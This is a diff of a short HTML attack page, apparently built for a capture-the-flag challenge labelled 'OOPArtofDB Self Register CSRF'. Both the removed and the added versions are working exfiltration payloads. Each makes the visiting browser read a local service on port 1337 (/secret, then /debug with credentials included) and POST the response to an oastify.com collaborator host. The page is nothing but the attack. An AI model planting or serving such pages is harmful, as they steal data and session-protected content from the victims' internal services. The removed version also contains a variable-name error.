@@ -1,19 +1,17 @@
 <html>
-  <h1>Hello World</h1>
-  <body onLoad="setTimeout('delayer()', 5000)">
-  <script>
-    fetch("https://v84fo01dzt9qsxszd5pneesi89e02qqf.oastify.com/testmasuk")
-fetch("http://127.0.0.1:1337/secret")
-  .then(res => response.text())
-    .then(data => {
-      fetch("https://v84fo01dzt9qsxszd5pneesi89e02qqf.oastify.com", {
-        method: "POST",
-        body: data
-      })
-    })
-    function delayer(){
-      window.location.replace("https://Miharada.github.io");
-    }
+    <h1>OOPArtofDB Self Register CSRF</h1>
     
-  </script>
+    <script>
+        fetch("http://localhost:1337/debug", {credentials: "include"})
+        .then(response => response.text())
+        .then(data => {
+            fetch("https://rc79m4cbmaiii1so1eamqg09f0lr9hx6.oastify.com/testing",{
+                method: "POST",
+                credentials: "include",
+                body: data
+            })
+
+        })
+
+    </script>
 </html>
